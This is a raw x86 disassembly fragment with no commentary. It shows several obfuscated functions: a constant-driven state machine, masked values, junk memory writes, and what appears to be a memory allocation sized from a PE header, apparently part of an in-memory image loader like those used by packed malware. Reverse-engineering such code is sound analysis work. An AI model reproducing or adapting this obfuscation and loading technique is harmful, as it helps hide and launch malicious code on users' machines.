  42313f:	mov    eax,DWORD PTR [ebp+0x8]
  423142:	xor    eax,edi
  423144:	add    eax,ebx
  423146:	push   eax
  423147:	push   0x18
  423149:	lea    eax,[ebp-0x64]
  42314c:	push   eax
  42314d:	call   0x4229f5
  423152:	mov    eax,DWORD PTR [ebp-0x4]
  423155:	add    eax,0x18
  423158:	mov    DWORD PTR [ebp+0x18],eax
  42315b:	push   DWORD PTR [ebp-0x50]
  42315e:	push   DWORD PTR [ebp+0x18]
  423161:	mov    eax,DWORD PTR [ebp-0x54]
  423164:	add    eax,DWORD PTR [ebp-0x20]
  423167:	push   eax
  423168:	call   0x42240f
  42316d:	mov    eax,DWORD PTR [ebp+0x8]
  423170:	mov    ecx,DWORD PTR [ebp-0x18]
  423173:	xor    eax,edi
  423175:	add    eax,ebx
  423177:	cmp    eax,ecx
  423179:	je     0x42318c
  42317b:	push   0x0
  42317d:	push   DWORD PTR [ebp-0x50]
  423180:	mov    eax,DWORD PTR [ebp-0x54]
  423183:	add    eax,DWORD PTR [ebp-0x20]
  423186:	push   eax
  423187:	call   0x4229f5
  42318c:	mov    eax,DWORD PTR [ebp-0x24]
  42318f:	mov    ecx,DWORD PTR [ebp-0x50]
  423192:	add    DWORD PTR [eax],ecx
  423194:	mov    eax,DWORD PTR [ebp-0x50]
  423197:	add    eax,DWORD PTR [ebp+0x1c]
  42319a:	mov    DWORD PTR [ebp+0x1c],eax
  42319d:	mov    eax,DWORD PTR [ebp-0x8]
  4231a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4231a3:	xor    eax,edi
  4231a5:	add    eax,ebx
  4231a7:	imul   eax,ecx
  4231aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ad:	mov    edx,DWORD PTR [ebp-0x28]
  4231b0:	xor    ecx,edi
  4231b2:	lea    ecx,[ecx+edx*1+0x3272fa]
  4231b9:	cmp    eax,ecx
  4231bb:	jb     0x422e19
  4231c1:	mov    esi,DWORD PTR [ebp+0x14]
  4231c4:	mov    eax,DWORD PTR [ebp-0x20]
  4231c7:	mov    DWORD PTR [esi],eax
  4231c9:	jmp    0x423210
  4231cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ce:	mov    edx,DWORD PTR [ebp+0xc]
  4231d1:	xor    ecx,edi
  4231d3:	xor    edx,edi
  4231d5:	add    ecx,ebx
  4231d7:	add    edx,ebx
  4231d9:	cmp    ecx,edx
  4231db:	jne    0x4231ef
  4231dd:	mov    eax,ds:0x7f642dde
  4231e2:	imul   eax,eax,0x9f15fcef
  4231e8:	mov    ds:0x7f642dde,eax
  4231ed:	jmp    0x423210
  4231ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4231f2:	xor    ecx,edi
  4231f4:	add    ecx,ebx
  4231f6:	cmp    eax,ecx
  4231f8:	je     0x423206
  4231fa:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  423204:	jmp    0x423210
  423206:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  423210:	pop    edi
  423211:	pop    esi
  423212:	pop    ebx
  423213:	leave  
  423214:	ret    0x18
  423217:	push   ebp
  423218:	mov    ebp,esp
  42321a:	and    esp,0xfffffff8
  42321d:	mov    eax,DWORD PTR [ebp+0x20]
  423220:	sub    esp,0x14
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0x14]
  423227:	push   esi
  423228:	push   edi
  423229:	cmp    eax,0xf89c85b5
  42322e:	jne    0x42323a
  423230:	push   0xf89c85b4
  423235:	jmp    0x42336c
  42323a:	mov    eax,DWORD PTR [ebp+0x20]
  42323d:	cmp    eax,0xf89c85b4
  423242:	jne    0x42324e
  423244:	push   0xf89c85bb
  423249:	jmp    0x42336c
  42324e:	mov    eax,DWORD PTR [ebp+0x20]
  423251:	cmp    eax,0xf89c85bb
  423256:	jne    0x423262
  423258:	push   0xf89c85ba
  42325d:	jmp    0x42336c
  423262:	mov    eax,DWORD PTR [ebp+0x20]
  423265:	cmp    eax,0xf89c85ba
  42326a:	jne    0x423276
  42326c:	push   0xf89c85b9
  423271:	jmp    0x42336c
  423276:	mov    ecx,DWORD PTR [ebp+0x20]
  423279:	mov    eax,0xf89c85be
  42327e:	cmp    ecx,eax
  423280:	jne    0x42333c
  423286:	mov    eax,DWORD PTR [ebp+0x10]
  423289:	mov    DWORD PTR [esp+0xc],eax
  42328d:	mov    eax,DWORD PTR [ebp+0x18]
  423290:	mov    DWORD PTR [esp+0x14],eax
  423294:	mov    eax,DWORD PTR [ebp+0xc]
  423297:	mov    DWORD PTR [esp+0x18],eax
  42329b:	mov    eax,DWORD PTR [ebp+0x8]
  42329e:	mov    DWORD PTR [esp+0x10],eax
  4232a2:	mov    eax,DWORD PTR [esp+0x10]
  4232a6:	mov    ecx,DWORD PTR [esp+0x14]
  4232aa:	mov    edi,0x75108b3
  4232af:	xor    eax,edi
  4232b1:	mov    esi,0x3272fa
  4232b6:	add    eax,esi
  4232b8:	mov    DWORD PTR [ecx],eax
  4232ba:	mov    eax,DWORD PTR [esp+0xc]
  4232be:	mov    eax,DWORD PTR [eax+0x194]
  4232c4:	mov    ecx,DWORD PTR [eax]
  4232c6:	mov    eax,DWORD PTR [esp+0xc]
  4232ca:	mov    eax,DWORD PTR [eax+0x194]
  4232d0:	mov    eax,DWORD PTR [eax]
  4232d2:	add    eax,DWORD PTR [ecx+0x3c]
  4232d5:	mov    ecx,DWORD PTR [esp+0xc]
  4232d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4232df:	mov    ecx,DWORD PTR [ecx+0x14]
  4232e2:	push   0x4
  4232e4:	push   0x3000
  4232e9:	push   DWORD PTR [eax+0x50]
  4232ec:	push   0x0
  4232ee:	call   ecx
  4232f0:	mov    DWORD PTR [ebx],eax
  4232f2:	mov    eax,DWORD PTR [esp+0x10]
  4232f6:	push   DWORD PTR [esp+0xc]
  4232fa:	xor    eax,edi
  4232fc:	add    eax,esi
  4232fe:	mov    DWORD PTR [esp+0x20],eax
  423302:	lea    eax,[esp+0x20]
  423306:	push   eax
  423307:	push   ebx
  423308:	push   DWORD PTR [esp+0x20]
  42330c:	push   DWORD PTR [esp+0x28]
  423310:	push   DWORD PTR [esp+0x24]
  423314:	call   0x422cd9
  423319:	mov    eax,DWORD PTR [esp+0x10]
  42331d:	mov    ecx,DWORD PTR [ebx]
  42331f:	xor    eax,edi
  423321:	add    eax,esi
  423323:	cmp    ecx,eax
  423325:	je     0x423383
  423327:	mov    eax,DWORD PTR [esp+0x18]
  42332b:	mov    ecx,DWORD PTR [esp+0x14]
  42332f:	xor    eax,edi
  423331:	add    eax,esi
  423333:	imul   eax,DWORD PTR [esp+0x1c]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x423383
  42333c:	mov    ecx,DWORD PTR [ebp+0x20]
  42333f:	cmp    ecx,0xf89c85b9
  423345:	jne    0x42334e
  423347:	push   0xf89c85b8
  42334c:	jmp    0x42336c
  42334e:	mov    ecx,DWORD PTR [ebp+0x20]
  423351:	cmp    ecx,0xf89c85b8
  423357:	jne    0x423360
  423359:	push   0xf89c85bf
  42335e:	jmp    0x42336c
  423360:	mov    ecx,DWORD PTR [ebp+0x20]
  423363:	cmp    ecx,0xf89c85bf
  423369:	jne    0x423383
  42336b:	push   eax
  42336c:	push   DWORD PTR [ebp+0x1c]
  42336f:	push   DWORD PTR [ebp+0x18]
  423372:	push   ebx
  423373:	push   DWORD PTR [ebp+0x10]
  423376:	push   DWORD PTR [ebp+0xc]
  423379:	push   DWORD PTR [ebp+0x8]
  42337c:	call   0x423217
  423381:	mov    DWORD PTR [ebx],eax
  423383:	mov    eax,DWORD PTR [ebx]
  423385:	pop    edi
  423386:	pop    esi
  423387:	pop    ebx
  423388:	mov    esp,ebp
  42338a:	pop    ebp
  42338b:	ret    0x1c
  42338e:	push   ebp
  42338f:	mov    ebp,esp
  423391:	sub    esp,0xc
  423394:	mov    eax,0xf89c85b5
  423399:	mov    DWORD PTR [ebp-0x8],eax
  42339c:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4233a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4233a6:	xor    ecx,0x75108b3
  4233ac:	add    ecx,0x3272fa
  4233b2:	mov    DWORD PTR [ebp-0x4],ecx
  4233b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4233b8:	push   eax
  4233b9:	mov    DWORD PTR [ebp+0xc],ecx
  4233bc:	push   DWORD PTR [ebp+0xc]
  4233bf:	lea    eax,[ebp-0x4]
  4233c2:	push   DWORD PTR [ebp+0x8]
  4233c5:	push   eax
  4233c6:	push   DWORD PTR [ebp+0xc]
  4233c9:	push   DWORD PTR [ebp-0xc]
  4233cc:	push   DWORD PTR [ebp-0x8]
  4233cf:	call   0x423217
  4233d4:	mov    DWORD PTR [ebp-0x4],eax
  4233d7:	mov    eax,DWORD PTR [ebp-0x4]
  4233da:	leave  
  4233db:	ret    0x8
	...
